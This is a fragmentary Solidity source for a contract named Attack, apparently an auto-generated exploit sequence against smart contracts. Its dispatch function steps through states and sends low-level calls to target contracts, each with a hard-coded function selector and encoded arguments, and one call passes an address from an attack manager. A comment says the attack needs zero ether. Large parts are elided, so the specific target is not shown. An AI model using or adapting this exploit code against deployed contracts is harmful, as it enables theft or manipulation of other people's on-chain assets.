 ...
 * parameter. Make sure to send at least 0 ether and 0 wei to the attack
    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 0) {
                 ...
                 */
                bytes memory data = bytes(hex"7adde4ef");
                uint value = 0x0;
            ...
            if (id == 0) {
                 ...
                 */
                bytes memory data = bytes(hex"4f798da7d6f21326ab749d5729fcba5677c79037b459436ab7bff709c9d06ce9f10c1a9dd6f21326ab749d5729fcba5677c79037b459436ab7bff709c9d06ce9f10c1a9e");
                uint value = 0x0;
                address payable target = payable(targets[0 % targets.length]);
                emit Calling(state, target, address(this), value, data);
                (bool success, bytes memory retdata) = target.call{ value: value }(data);
            ...
            if (id == 0) {
                 ...
                 */
                bytes memory data = bytes(hex"fd10d655");
                uint value = 0x0;
                address payable target = payable(targets[0 % targets.length]);
                emit Calling(state, target, address(this), value, data);
                (bool success, bytes memory retdata) = target.call{ value: value }(data);
            ...
            if (id == 0) {
                 ...
                 */
                bytes memory data = abi.encodePacked(hex"fd10d655000000000000000000000000", (manager.__id_to_address(0)));
                uint value = 0x0;
                address payable target = payable(targets[0 % targets.length]);
                emit Calling(state, target, address(this), value, data);
                (bool success, bytes memory retdata) = target.call{ value: value }(data);
            ...
            if (id == 0) {
                 ...
                 */
                bytes memory data = bytes(hex"f58fef8e");
                uint value = 0x0;
                address payable target = payable(targets[0 % targets.length]);
                emit Calling(state, target, address(this), value, data);
                (bool success, bytes memory retdata) = target.call{ value: value }(data);
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x0; /* equals 0 ether and 0 wei */
